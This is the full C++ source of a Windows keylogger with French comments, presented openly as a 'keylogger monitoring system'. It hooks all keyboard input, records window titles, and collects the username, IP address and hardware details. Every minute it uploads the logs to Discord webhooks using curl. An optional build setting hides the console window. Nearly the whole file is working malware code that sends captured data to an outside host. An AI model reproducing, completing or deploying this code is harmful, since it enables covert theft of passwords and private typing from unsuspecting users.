#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <map>
#include <chrono>
#include <ctime>
#include <iomanip>
#include <Lmcons.h>
#include <random>
#include <tlhelp32.h>
#include <psapi.h>
#include <versionhelpers.h>
#include <shlobj.h>
#include <objbase.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

// Définition des URLs des webhooks Discord
#define WEBHOOK_INFO "<YOUR_WEBHOOK_URL_HERE>"
#define WEBHOOK_CONNEXION "<YOUR_WEBHOOK_URL_HERE>"
#define WEBHOOK_LOGS "<YOUR_WEBHOOK_URL_HERE>"
#define WEBHOOK_DESACTIVATION "<YOUR_WEBHOOK_URL_HERE>"

// Définitions pour le comportement du programme
#define visible
#define bootwait
#define FORMAT 0
#define mouseignore
#define SHOW_DEBUG_WINDOW

// Déclaration anticipée des fonctions
int Save(int key_stroke);
void sendExitMessage(const std::string& reason);
void sendInfoMessage();
void sendConnexionMessage();
void sendLogMessage(const std::string& filepath);
BOOL WINAPI consoleHandler(DWORD signal);
std::string getUsername();

// Variables globales
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
std::ofstream output_file;
char output_filename[256];
int cur_hour = -1;
std::string messageBuffer;
auto lastSendTime = std::chrono::steady_clock::now();
std::string pcId;

// Map pour les noms des touches
#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, " "},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"},
    {VK_OEM_PERIOD, "."},
    {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"},
    {VK_OEM_MINUS, "-"},
    {VK_ADD, "+"},
    {VK_SUBTRACT, "-"},
    {VK_CAPITAL, "[CAPSLOCK]"},
};
#endif

// Codes couleur pour le terminal
#define COLOR_BLACK 0
#define COLOR_DARK_BLUE 1
#define COLOR_DARK_GREEN 2
#define COLOR_DARK_CYAN 3
#define COLOR_DARK_RED 4
#define COLOR_DARK_MAGENTA 5
#define COLOR_DARK_YELLOW 6
#define COLOR_GRAY 7
#define COLOR_DARK_GRAY 8
#define COLOR_BLUE 9
#define COLOR_GREEN 10
#define COLOR_CYAN 11
#define COLOR_RED 12
#define COLOR_MAGENTA 13
#define COLOR_YELLOW 14
#define COLOR_WHITE 15

// Fonction pour définir la page de codes en UTF-8
void setUTF8Console() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
}

// Fonction pour définir la couleur de la console
void setColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

// Fonction pour afficher un en-tête stylisé
void printHeader() {
    system("cls");
    setColor(COLOR_CYAN);
    std::cout << "\n";
    std::cout << "  ╔═══════════════════════════════════════════════════════════════╗\n";
    std::cout << "  ║                                                               ║\n";
    std::cout << "  ║           ";
    setColor(COLOR_WHITE);
    std::cout << "🔐 KEYLOGGER MONITORING SYSTEM 🔐";
    setColor(COLOR_CYAN);
    std::cout << "              ║\n";
    std::cout << "  ║                                                               ║\n";
    std::cout << "  ╚═══════════════════════════════════════════════════════════════╝\n";
    setColor(COLOR_GRAY);
    std::cout << "\n";
}

// Fonction pour afficher un message avec un préfixe stylisé
void printMessage(const std::string& type, const std::string& message, int color) {
    setColor(color);
    std::cout << "  [" << type << "] ";
    setColor(COLOR_WHITE);
    std::cout << message << "\n";
    setColor(COLOR_GRAY);
}

// Fonction pour afficher une ligne de séparation
void printSeparator() {
    setColor(COLOR_DARK_GRAY);
    std::cout << "  ───────────────────────────────────────────────────────────────\n";
    setColor(COLOR_GRAY);
}

// Fonction pour échapper les caractères spéciaux pour JSON
std::string escapeJson(const std::string& s) {
    std::ostringstream o;
    for (auto c = s.cbegin(); c != s.cend(); c++) {
        if (*c == '"') {
            o << "\\\"";
        }
        else if (*c == '\\') {
            o << "\\\\";
        }
        else if (*c == '\b') {
            o << "\\b";
        }
        else if (*c == '\f') {
            o << "\\f";
        }
        else if (*c == '\n') {
            o << "\\n";
        }
        else if (*c == '\r') {
            o << "\\r";
        }
        else if (*c == '\t') {
            o << "\\t";
        }
        else {
            o << *c;
        }
    }
    return o.str();
}

// Fonction pour récupérer l'heure actuelle
std::string getCurrentTime() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);
    struct tm tm_info;
    localtime_s(&tm_info, &in_time_t);
    std::stringstream ss;
    ss << std::put_time(&tm_info, "%H:%M:%S");
    return ss.str();
}

// Fonction pour récupérer le nom d'utilisateur
std::string getUsername() {
    char username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    if (GetUserNameA(username, &size)) {
        return username;
    }
    return "Unknown_User";
}

// Fonction pour générer un identifiant unique basé sur l'IP
std::string generatePCIdFromIP(const std::string& ipAddress) {
    std::string id = ipAddress;
    std::replace(id.begin(), id.end(), '.', '_');
    return "PC_" + id;
}

// Fonction pour récupérer l'adresse IP locale
std::string getLocalIPAddress() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return "Unknown_IP";
    }
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
        WSACleanup();
        return "Unknown_IP";
    }
    struct hostent* host = gethostbyname(hostname);
    if (host == nullptr) {
        WSACleanup();
        return "Unknown_IP";
    }
    struct in_addr addr;
    memcpy(&addr, host->h_addr_list[0], sizeof(addr));
    std::string ipAddress = inet_ntoa(addr);
    WSACleanup();
    return ipAddress;
}

// Fonction pour récupérer le nom de l'ordinateur
std::string getComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameA(computerName, &size)) {
        return computerName;
    }
    return "Unknown_Computer";
}

// Fonction pour récupérer la version de Windows
std::string getWindowsVersion() {
    if (IsWindows10OrGreater()) {
        return "Windows 10 ou superieur";
    }
    else if (IsWindows8OrGreater()) {
        return "Windows 8 ou 8.1";
    }
    else if (IsWindows7OrGreater()) {
        return "Windows 7";
    }
    else {
        return "Version inconnue";
    }
}

// Fonction pour récupérer l'architecture (32/64 bits)
std::string getSystemArchitecture() {
#ifdef _WIN64
    return "64-bit";
#else
    return "32-bit";
#endif
}

// Fonction pour récupérer la mémoire totale et disponible
std::string getMemoryInfo() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    double totalMem = static_cast<double>(memInfo.ullTotalPhys) / (1024 * 1024 * 1024);
    double freeMem = static_cast<double>(memInfo.ullAvailPhys) / (1024 * 1024 * 1024);
    std::ostringstream oss;
    oss << std::fixed << std::setprecision(2) << totalMem << " Go (Disponible: " << freeMem << " Go)";
    return oss.str();
}

// Fonction pour récupérer l'espace disque
std::string getDiskSpace() {
    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
        double totalSpace = static_cast<double>(totalNumberOfBytes.QuadPart) / (1024 * 1024 * 1024);
        double freeSpace = static_cast<double>(freeBytesAvailable.QuadPart) / (1024 * 1024 * 1024);
        std::ostringstream oss;
        oss << std::fixed << std::setprecision(2) << freeSpace << " Go / " << totalSpace << " Go";
        return oss.str();
    }
    return "Inconnu";
}

// Fonction pour récupérer le nom du processeur
std::string getProcessorName() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    switch (sysInfo.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64: return "AMD64";
    case PROCESSOR_ARCHITECTURE_ARM: return "ARM";
    case PROCESSOR_ARCHITECTURE_IA64: return "IA64";
    case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
    default: return "Inconnu";
    }
}

// Fonction pour envoyer un message avec toutes les informations du PC
void sendInfoMessage() {
    printMessage("INFO", "Preparation des informations systeme...", COLOR_CYAN);

    std::string username = getUsername();
    std::string ipAddress = getLocalIPAddress();
    std::string currentTime = getCurrentTime();
    std::string computerName = getComputerName();
    std::string windowsVersion = getWindowsVersion();
    std::string architecture = getSystemArchitecture();
    std::string processor = getProcessorName();
    std::string memory = getMemoryInfo();
    std::string diskSpace = getDiskSpace();

    pcId = generatePCIdFromIP(ipAddress);

    std::ostringstream jsonPayload;
    jsonPayload << "{"
        << "\"embeds\":[{"
        << "\"title\":\"🖥️ Nouvelle Session Demarree\","
        << "\"color\":3066993,"
        << "\"fields\":["
        << "{\"name\":\"🔑 ID du PC\",\"value\":\"" << escapeJson(pcId) << "\",\"inline\":true},"
        << "{\"name\":\"💻 Nom de l'ordinateur\",\"value\":\"" << escapeJson(computerName) << "\",\"inline\":true},"
        << "{\"name\":\"👤 Utilisateur\",\"value\":\"" << escapeJson(username) << "\",\"inline\":true},"
        << "{\"name\":\"🌐 Adresse IP\",\"value\":\"" << escapeJson(ipAddress) << "\",\"inline\":true},"
        << "{\"name\":\"🪟 Version Windows\",\"value\":\"" << escapeJson(windowsVersion) << "\",\"inline\":true},"
        << "{\"name\":\"⚙️ Architecture\",\"value\":\"" << escapeJson(architecture) << "\",\"inline\":true},"
        << "{\"name\":\"🔧 Processeur\",\"value\":\"" << escapeJson(processor) << "\",\"inline\":true},"
        << "{\"name\":\"💾 Memoire\",\"value\":\"" << escapeJson(memory) << "\",\"inline\":true},"
        << "{\"name\":\"📁 Espace disque (C:)\",\"value\":\"" << escapeJson(diskSpace) << "\",\"inline\":true},"
        << "{\"name\":\"🕐 Heure de connexion\",\"value\":\"" << escapeJson(currentTime) << "\",\"inline\":false}"
        << "],"
        << "\"footer\":{\"text\":\"Les logs seront envoyes toutes les 60 secondes\"}"
        << "}]"
        << "}";

    std::ofstream jsonFile("temp_info.json");
    jsonFile << jsonPayload.str();
    jsonFile.close();

    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @temp_info.json \"" + std::string(WEBHOOK_INFO) + "\" -k --silent";

    printMessage("SEND", "Envoi des informations systeme a Discord...", COLOR_YELLOW);

    int result = system(command.c_str());
    if (result != 0) {
        printMessage("ERROR", "Echec de l'envoi du message d'informations", COLOR_RED);
    }
    else {
        printMessage("SUCCESS", "Message d'informations envoye avec succes!", COLOR_GREEN);
    }
}

// Fonction pour envoyer un message de connexion
void sendConnexionMessage() {
    std::ostringstream jsonPayload;
    jsonPayload << "{"
        << "\"embeds\":[{"
        << "\"title\":\"✅ Connexion Etablie\","
        << "\"description\":\"Connexion etablie avec succes\","
        << "\"color\":5763719,"
        << "\"fields\":["
        << "{\"name\":\"🖥️ PC ID\",\"value\":\"" << escapeJson(pcId) << "\",\"inline\":true},"
        << "{\"name\":\"🕐 Heure\",\"value\":\"" << escapeJson(getCurrentTime()) << "\",\"inline\":true}"
        << "],"
        << "\"footer\":{\"text\":\"Keylogger actif\"}"
        << "}]"
        << "}";

    std::ofstream jsonFile("temp_connexion.json");
    jsonFile << jsonPayload.str();
    jsonFile.close();

    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @temp_connexion.json \"" + std::string(WEBHOOK_CONNEXION) + "\" -k --silent";

    printMessage("SEND", "Envoi du message de connexion...", COLOR_YELLOW);

    int result = system(command.c_str());
    if (result != 0) {
        printMessage("ERROR", "Echec de l'envoi du message de connexion", COLOR_RED);
    }
    else {
        printMessage("SUCCESS", "Message de connexion envoye avec succes!", COLOR_GREEN);
    }
}

// Fonction pour envoyer un message de désactivation
void sendExitMessage(const std::string& reason) {
    std::ostringstream jsonPayload;
    jsonPayload << "{"
        << "\"embeds\":[{"
        << "\"title\":\"⚠️ Keylogger Desactive\","
        << "\"description\":\"" << escapeJson(reason) << "\","
        << "\"color\":15158332,"
        << "\"fields\":["
        << "{\"name\":\"🖥️ PC ID\",\"value\":\"" << escapeJson(pcId) << "\",\"inline\":true},"
        << "{\"name\":\"🕐 Heure\",\"value\":\"" << escapeJson(getCurrentTime()) << "\",\"inline\":true}"
        << "],"
        << "\"footer\":{\"text\":\"Session terminee\"}"
        << "}]"
        << "}";

    std::ofstream jsonFile("temp_exit.json");
    jsonFile << jsonPayload.str();
    jsonFile.close();

    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @temp_exit.json \"" + std::string(WEBHOOK_DESACTIVATION) + "\" -k --silent";

    printMessage("EXIT", "Envoi du message de desactivation...", COLOR_YELLOW);
    system(command.c_str());
}

// Fonction pour envoyer un fichier de log
void sendLogMessage(const std::string& filepath) {
    std::ostringstream jsonPayload;
    jsonPayload << "{"
        << "\"embeds\":[{"
        << "\"title\":\"📝 Nouveaux Logs Disponibles\","
        << "\"color\":3447003,"
        << "\"fields\":["
        << "{\"name\":\"🖥️ PC ID\",\"value\":\"" << escapeJson(pcId) << "\",\"inline\":true},"
        << "{\"name\":\"🕐 Heure\",\"value\":\"" << escapeJson(getCurrentTime()) << "\",\"inline\":true},"
        << "{\"name\":\"📄 Fichier\",\"value\":\"" << escapeJson(filepath) << "\",\"inline\":false}"
        << "],"
        << "\"footer\":{\"text\":\"Voir le fichier ci-joint\"}"
        << "}]"
        << "}";

    std::ofstream jsonFile("temp_log_embed.json");
    jsonFile << jsonPayload.str();
    jsonFile.close();

    std::string embedCommand = "curl -X POST -H \"Content-Type: application/json\" -d @temp_log_embed.json \"" + std::string(WEBHOOK_LOGS) + "\" -k --silent";
    system(embedCommand.c_str());

    std::string fileCommand = "curl -X POST -F \"file=@" + filepath + "\" \"" + std::string(WEBHOOK_LOGS) + "\" -k --silent";

    printMessage("SEND", "Envoi des logs pour " + pcId + "...", COLOR_YELLOW);

    int result = system(fileCommand.c_str());
    if (result != 0) {
        printMessage("ERROR", "Echec de l'envoi du fichier de log", COLOR_RED);
    }
    else {
        printMessage("SUCCESS", "Fichier de log envoye avec succes!", COLOR_GREEN);
    }
}

// Gestionnaire pour la fermeture forcée
BOOL WINAPI consoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        sendExitMessage("ferme manuellement (Ctrl+C)");
    }
    else if (signal == CTRL_CLOSE_EVENT) {
        sendExitMessage("ferme par la fenetre");
    }
    Sleep(2000);
    return TRUE;
}

// Fonction pour envoyer les logs si 60 secondes se sont écoulées
void sendBufferIfNeeded() {
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastSendTime).count();
    if (elapsed >= 60) {
        if (!messageBuffer.empty()) {
            printMessage("TIMER", "60 secondes ecoulees - Envoi des logs...", COLOR_MAGENTA);
            std::string filename = "logs/log_" + pcId + "_" + std::to_string(time(NULL)) + ".txt";
            std::ofstream logFile(filename);
            logFile << messageBuffer;
            logFile.close();
            sendLogMessage(filename);
            messageBuffer.clear();
        }
        lastSendTime = now;
    }
}

// Callback pour le hook clavier
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            Save(kbdStruct.vkCode);
        }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// Fonction pour installer le hook
void SetHook() {
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        printMessage("ERROR", "Echec de l'installation du hook!", COLOR_RED);
        MessageBox(NULL, L"Echec de l'installation du hook !", L"Erreur", MB_ICONERROR);
    }
    else {
        printMessage("SUCCESS", "Hook installe avec succes", COLOR_GREEN);
    }
}

// Fonction pour libérer le hook
void ReleaseHook() {
    UnhookWindowsHookEx(_hook);
    printMessage("INFO", "Hook libere", COLOR_CYAN);
}

// Fonction pour sauvegarder les logs
int Save(int key_stroke) {
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2)) {
        return 0;
    }
#endif
    HWND foreground = GetForegroundWindow();
    if (!foreground) {
        return 0;
    }
    DWORD threadID = GetWindowThreadProcessId(foreground, NULL);
    HKL layout = GetKeyboardLayout(threadID);
    struct tm tm_info;
    time_t t = time(NULL);
    localtime_s(&tm_info, &t);
    char window_title[256];
    if (GetWindowTextA(foreground, (LPSTR)window_title, 256) == 0) {
        return 0;
    }
    if (strcmp(window_title, lastwindow) != 0) {
        strcpy_s(lastwindow, sizeof(lastwindow), window_title);
        char s[64];
        strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
        output << "\n\n[Window: " << window_title << " - at " << s << "] ";
    }
#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end()) {
        output << keyname.at(key_stroke);
    }
    else {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
        if (!lowercase) {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    if (cur_hour != tm_info.tm_hour) {
        cur_hour = tm_info.tm_hour;
        output_file.close();
        strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
        output_file.open(output_filename, std::ios_base::app);
        printMessage("INFO", std::string("Journalisation dans ") + output_filename, COLOR_CYAN);
    }
    output_file << output.str();
    output_file.flush();
    messageBuffer += output.str();
    sendBufferIfNeeded();
    return 0;
}

// Fonction pour masquer la console
void Stealth() {
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif
#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

// Fonction pour vérifier si le système est en cours de démarrage
bool IsSystemBooting() {
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

// Fonction principale
int main() {
    setUTF8Console();
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

    SetConsoleCtrlHandler(consoleHandler, TRUE);

    printHeader();
    printMessage("INIT", "Demarrage du keylogger...", COLOR_CYAN);
    printSeparator();

    Stealth();

    if (CreateDirectory(L"logs", NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        printMessage("SUCCESS", "Dossier de logs pret", COLOR_GREEN);
    }
    else {
        printMessage("ERROR", "Impossible de creer le dossier de logs", COLOR_RED);
    }

    printSeparator();
    sendInfoMessage();
    printSeparator();
    sendConnexionMessage();
    printSeparator();

    std::atexit([]() { sendExitMessage("ferme normalement"); });

#ifdef bootwait
    while (IsSystemBooting()) {
        printMessage("WAIT", "Le systeme est toujours en demarrage. Attente de 10 secondes...", COLOR_YELLOW);
        Sleep(10000);
    }
#endif

    SetHook();
    printSeparator();
    printMessage("ACTIVE", "Keylogger actif - En attente de frappes clavier...", COLOR_GREEN);
    printSeparator();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        Sleep(1000);
        sendBufferIfNeeded();
    }
    ReleaseHook();
    CoUninitialize();
    return 0;

}
